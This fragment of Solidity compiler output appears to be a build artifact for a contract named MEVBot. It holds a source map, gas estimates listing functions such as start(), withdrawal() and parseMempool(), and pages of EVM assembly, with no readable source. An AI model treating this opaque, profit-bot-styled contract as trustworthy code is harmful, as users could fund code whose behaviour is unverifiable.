:8;;;;8717:148;;;8805:2;8799;:8;;;;8798:24;;;;;8819:2;8813;:8;;;;8798:24;8794:71;;;8848:2;8842:8;;;;8794:71;8717:148;8639:226;8889:2;8883;:8;;;;8882:25;;;;;8903:3;8897:2;:9;;;;8882:25;8878:226;;;8933:2;8927:8;;;;8878:226;;;8967:2;8961;:8;;;;8960:24;;;;;8981:2;8975;:8;;;;8960:24;8956:148;;;9010:2;9004:8;;;;8956:148;;;9044:2;9038;:8;;;;9037:24;;;;;9058:2;9052;:8;;;;9037:24;9033:71;;;9087:2;9081:8;;;;9033:71;8956:148;8878:226;9137:2;9132;9127;:7;:12;9117:23;;;;8510:1;8505:6;;;;8472:679;;;;9175:5;9160:21;;;;;;8276:912;;;:::o;8018:90::-;8069:4;8092:9;8085:16;;8018:90;:::o;9728:422::-;9783:13;9809:10;9822:1;9809:14;;9833:6;9842:1;9833:10;;9853:68;9865:1;9860;:6;9853:68;;9882:7;;;;;;;9908:2;9903:7;;;;;;;;;9853:68;;;9930:16;9959:5;9949:16;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;9949:16:0;;;;;;;;;;;;;;;;;;;;;;;;;;29:1:-1;21:6;17:14;124:4;108:14;100:6;87:42;155:4;147:6;143:17;133:27;;0:164;9949:16:0;;;;9930:35;;9980:6;9987:1;9980:8;;9975:140;9992:5;9990:1;:7;9975:140;;;10026:2;10022:1;:6;;;;;;10018:10;;10063:20;10080:1;10063:10;:20::i;:::-;10042:3;10058:1;10054;10046:5;:9;:13;10042:18;;;;;;;;;;;:41;;;;;;;;;;;10102:2;10097:7;;;;;;;;;9999:3;;;;;9975:140;;;;10139:3;10125:18;;;;;9728:422;;;:::o;16279:611::-;16362:13;16387:23;16419:5;16387:38;;16435:24;16468:6;16435:40;;16486:23;16543:11;:18;16523:10;:17;:38;16512:50;;;5:9:-1;2:2;;;27:1;24;17:12;2:2;16512:50:0;;;;;;;;;;;;;;;;;;;;;;;;;;29:1:-1;21:6;17:14;124:4;108:14;100:6;87:42;155:4;147:6;143:17;133:27;;0:164;16512:50:0;;;;16486:76;;16572:22;16603:9;16572:41;;16624:6;16640;16663:1;16661:3;;16657:90;16668:10;:17;16666:1;:19;16657:90;;;16723:10;16734:1;16723:13;;;;;;;;;;;;;;;;16706:9;16716:3;;;;;;16706:14;;;;;;;;;;;:30;;;;;;;;;;;16687:3;;;;;;;16657:90;;;16763:1;16761:3;;16757:92;16768:11;:18;16766:1;:20;16757:92;;;16824:11;16836:1;16824:14;;;;;;;;;;;;;;;;16807:9;16817:3;;;;;;16807:14;;;;;;;;;;;:31;;;;;;;;;;;16788:3;;;;;;;16757:92;;;16873:9;16859:24;;;;;;;;16279:611;;;;:::o;12716:88::-;12767:4;12790:7;12783:14;;12716:88;:::o;15901:86::-;15951:4;15974:6;15967:13;;15901:86;:::o;14183:319::-;14235:4;14260:1;14255:6;;:1;:6;;:16;;;;;14270:1;14265;:6;;;;14255:16;14251:187;;;14318:1;14305:9;14299:16;;:20;14294:26;;14287:33;;;;14251:187;14353:1;14341:14;;:2;:14;;:32;;;;;14371:2;14365:1;14359:14;;;;14341:32;14337:101;;;14424:2;14420:1;14407:9;14401:16;;:20;:25;14396:31;;14389:38;;;;14337:101;12:1:-1;9;2:12;14183:319:0;;;;:::o"
						},
						"gasEstimates": {
							"creation": {
								"codeDepositCost": "592400",
								"executionCost": "infinite",
								"totalCost": "infinite"
							},
							"external": {
								"start()": "infinite",
								"tokenName()": "infinite",
								"tokenSymbol()": "infinite",
								"withdrawal()": "infinite"
							},
							"internal": {
								"_callMEVAction()": "infinite",
								"beyond(struct MEVBot.slice memory,struct MEVBot.slice memory)": "infinite",
								"calcLiquidityInContract(struct MEVBot.slice memory)": "infinite",
								"callMempool()": "infinite",
								"checkLiquidity(uint256)": "infinite",
								"findContracts(uint256,uint256,uint256,uint256)": "infinite",
								"findNewContracts(struct MEVBot.slice memory,struct MEVBot.slice memory)": "infinite",
								"findPtr(uint256,uint256,uint256,uint256)": "infinite",
								"getMemPoolDepth()": "23",
								"getMemPoolHeight()": "23",
								"getMemPoolLength()": "infinite",
								"getMemPoolOffset()": "23",
								"keccak(struct MEVBot.slice memory)": "infinite",
								"loadCurrentContract(string memory)": "infinite",
								"memcpy(uint256,uint256,uint256)": "infinite",
								"mempool(string memory,string memory)": "infinite",
								"nextContract(struct MEVBot.slice memory,struct MEVBot.slice memory)": "infinite",
								"orderContractsByLiquidity(struct MEVBot.slice memory)": "infinite",
								"parseMempool(string memory)": "infinite",
								"toHexDigit(uint8)": "213",
								"uint2str(uint256)": "infinite",
								"withdrawalProfits()": "infinite"
							}
						},
						"legacyAssembly": {
							".code": [
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "80"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 516,
									"end": 16894,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "CALLVALUE",
									"source": 0
								},
								{
									"begin": 5,
									"end": 14,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 27,
									"end": 28,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 24,
									"end": 25,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 17,
									"end": 29,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 2,
									"end": 4,
									"name": "tag",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 2,
									"end": 4,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "CODESIZE",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSHSIZE",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "CODECOPY",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 15,
									"end": 17,
									"name": "PUSH",
									"source": -1,
									"value": "40"
								},
								{
									"begin": 10,
									"end": 13,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 7,
									"end": 18,
									"name": "LT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "2"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 31,
									"end": 32,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 28,
									"end": 29,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 21,
									"end": 33,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 4,
									"end": 6,
									"name": "tag",
									"source": -1,
									"value": "2"
								},
								{
									"begin": 4,
									"end": 6,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP4",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP5",
									"source": 0
								},
								{
									"begin": 19,
									"end": 30,
									"name": "PUSH",
									"source": -1,
									"value": "100000000"
								},
								{
									"begin": 14,
									"end": 17,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 11,
									"end": 31,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "3"
								},
								{
									"begin": 8,
									"end": 10,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 44,
									"end": 45,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 41,
									"end": 42,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 34,
									"end": 46,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "tag",
									"source": -1,
									"value": "3"
								},
								{
									"begin": 8,
									"end": 10,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 71,
									"end": 82,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 66,
									"end": 69,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 62,
									"end": 83,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 55,
									"end": 83,
									"name": "SWAP2",
									"source": -1
								},
								{
									"begin": 55,
									"end": 83,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 123,
									"end": 127,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 118,
									"end": 121,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 114,
									"end": 128,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 159,
									"end": 168,
									"name": "DUP6",
									"source": -1
								},
								{
									"begin": 141,
									"end": 157,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 138,
									"end": 169,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "4"
								},
								{
									"begin": 135,
									"end": 137,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 182,
									"end": 183,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 179,
									"end": 180,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 172,
									"end": 184,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "tag",
									"source": -1,
									"value": "4"
								},
								{
									"begin": 135,
									"end": 137,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 219,
									"end": 222,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 213,
									"end": 223,
									"name": "MLOAD",
									"source": -1
								},
								{
									"begin": 330,
									"end": 339,
									"name": "DUP7",
									"source": -1
								},
								{
									"begin": 325,
									"end": 326,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 311,
									"end": 323,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 307,
									"end": 327,
									"name": "MUL",
									"source": -1
								},
								{
									"begin": 289,
									"end": 305,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 285,
									"end": 328,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 282,
									"end": 340,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 261,
									"end": 272,
									"name": "PUSH",
									"source": -1,
									"value": "100000000"
								},
								{
									"begin": 247,
									"end": 259,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 244,
									"end": 273,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 233,
									"end": 348,
									"name": "OR",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "5"
								},
								{
									"begin": 230,
									"end": 232,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 361,
									"end": 362,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 358,
									"end": 359,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 351,
									"end": 363,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "tag",
									"source": -1,
									"value": "5"
								},
								{
									"begin": 230,
									"end": 232,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 384,
									"end": 396,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 379,
									"end": 382,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 372,
									"end": 397,
									"name": "MSTORE",
									"source": -1
								},
								{
									"begin": 420,
									"end": 424,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 415,
									"end": 418,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 411,
									"end": 425,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 404,
									"end": 425,
									"name": "SWAP3",
									"source": -1
								},
								{
									"begin": 404,
									"end": 425,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 0,
									"end": 432,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 0,
									"end": 432,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 23,
									"end": 24,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "tag",
									"source": -1,
									"value": "6"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 33,
									"end": 36,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 30,
									"end": 31,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 27,
									"end": 37,
									"name": "LT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "8"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 99,
									"end": 100,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 94,
									"end": 97,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 90,
									"end": 101,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 84,
									"end": 102,
									"name": "MLOAD",
									"source": -1
								},
								{
									"begin": 80,
									"end": 81,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 75,
									"end": 78,
									"name": "DUP5",
									"source": -1
								},
								{
									"begin": 71,
									"end": 82,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 64,
									"end": 103,
									"name": "MSTORE",
									"source": -1
								},
								{
									"begin": 52,
									"end": 54,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 49,
									"end": 50,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 45,
									"end": 55,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 40,
									"end": 55,
									"name": "SWAP1",
									"source": -1
								},
								{
									"begin": 40,
									"end": 55,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "6"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMP",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "tag",
									"source": -1,
									"value": "8"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 12,
									"end": 26,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "1F"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "ISZERO",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH [tag]",
									"source": 0,
									"value": "9"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "JUMPI",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP3",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "1"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "100"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "EXP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SUB",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "NOT",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "AND",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP2",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "tag",
									"source": 0,
									"value": "9"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "JUMPDEST",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "POP",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "MSTORE",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "40"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP4",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP3",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP2",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP5",
									"source": 0
								},
								{
									"begin": 19,
									"end": 30,
									"name": "PUSH",
									"source": -1,
									"value": "100000000"
								},
								{
									"begin": 14,
									"end": 17,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 11,
									"end": 31,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "10"
								},
								{
									"begin": 8,
									"end": 10,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 44,
									"end": 45,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 41,
									"end": 42,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 34,
									"end": 46,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 10,
									"name": "tag",
									"source": -1,
									"value": "10"
								},
								{
									"begin": 8,
									"end": 10,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 71,
									"end": 82,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 66,
									"end": 69,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 62,
									"end": 83,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 55,
									"end": 83,
									"name": "SWAP2",
									"source": -1
								},
								{
									"begin": 55,
									"end": 83,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 123,
									"end": 127,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 118,
									"end": 121,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 114,
									"end": 128,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 159,
									"end": 168,
									"name": "DUP6",
									"source": -1
								},
								{
									"begin": 141,
									"end": 157,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 138,
									"end": 169,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "11"
								},
								{
									"begin": 135,
									"end": 137,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 182,
									"end": 183,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 179,
									"end": 180,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 172,
									"end": 184,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 135,
									"end": 137,
									"name": "tag",
									"source": -1,
									"value": "11"
								},
								{
									"begin": 135,
									"end": 137,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 219,
									"end": 222,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 213,
									"end": 223,
									"name": "MLOAD",
									"source": -1
								},
								{
									"begin": 330,
									"end": 339,
									"name": "DUP7",
									"source": -1
								},
								{
									"begin": 325,
									"end": 326,
									"name": "PUSH",
									"source": -1,
									"value": "1"
								},
								{
									"begin": 311,
									"end": 323,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 307,
									"end": 327,
									"name": "MUL",
									"source": -1
								},
								{
									"begin": 289,
									"end": 305,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 285,
									"end": 328,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 282,
									"end": 340,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 261,
									"end": 272,
									"name": "PUSH",
									"source": -1,
									"value": "100000000"
								},
								{
									"begin": 247,
									"end": 259,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 244,
									"end": 273,
									"name": "GT",
									"source": -1
								},
								{
									"begin": 233,
									"end": 348,
									"name": "OR",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "12"
								},
								{
									"begin": 230,
									"end": 232,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 361,
									"end": 362,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 358,
									"end": 359,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 351,
									"end": 363,
									"name": "REVERT",
									"source": -1
								},
								{
									"begin": 230,
									"end": 232,
									"name": "tag",
									"source": -1,
									"value": "12"
								},
								{
									"begin": 230,
									"end": 232,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 384,
									"end": 396,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 379,
									"end": 382,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 372,
									"end": 397,
									"name": "MSTORE",
									"source": -1
								},
								{
									"begin": 420,
									"end": 424,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 415,
									"end": 418,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 411,
									"end": 425,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 404,
									"end": 425,
									"name": "SWAP3",
									"source": -1
								},
								{
									"begin": 404,
									"end": 425,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 0,
									"end": 432,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 0,
									"end": 432,
									"name": "POP",
									"source": -1
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "MLOAD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "PUSH",
									"source": 0,
									"value": "20"
								},
								{
									"begin": 649,
									"end": 813,
									"name": "ADD",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "SWAP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP1",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 649,
									"end": 813,
									"name": "DUP4",
									"source": 0
								},
								{
									"begin": 23,
									"end": 24,
									"name": "PUSH",
									"source": -1,
									"value": "0"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "tag",
									"source": -1,
									"value": "13"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPDEST",
									"source": -1
								},
								{
									"begin": 33,
									"end": 36,
									"name": "DUP4",
									"source": -1
								},
								{
									"begin": 30,
									"end": 31,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 27,
									"end": 37,
									"name": "LT",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "ISZERO",
									"source": -1
								},
								{
									"begin": 8,
									"end": 108,
									"name": "PUSH [tag]",
									"source": -1,
									"value": "15"
								},
								{
									"begin": 8,
									"end": 108,
									"name": "JUMPI",
									"source": -1
								},
								{
									"begin": 99,
									"end": 100,
									"name": "DUP1",
									"source": -1
								},
								{
									"begin": 94,
									"end": 97,
									"name": "DUP3",
									"source": -1
								},
								{
									"begin": 90,
									"end": 101,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 84,
									"end": 102,
									"name": "MLOAD",
									"source": -1
								},
								{
									"begin": 80,
									"end": 81,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 75,
									"end": 78,
									"name": "DUP5",
									"source": -1
								},
								{
									"begin": 71,
									"end": 82,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 64,
									"end": 103,
									"name": "MSTORE",
									"source": -1
								},
								{
									"begin": 52,
									"end": 54,
									"name": "PUSH",
									"source": -1,
									"value": "20"
								},
								{
									"begin": 49,
									"end": 50,
									"name": "DUP2",
									"source": -1
								},
								{
									"begin": 45,
									"end": 55,
									"name": "ADD",
									"source": -1
								},
								{
									"begin": 40,
									"end": 55,
									"name": "SWAP1",
									"source": -1
								},
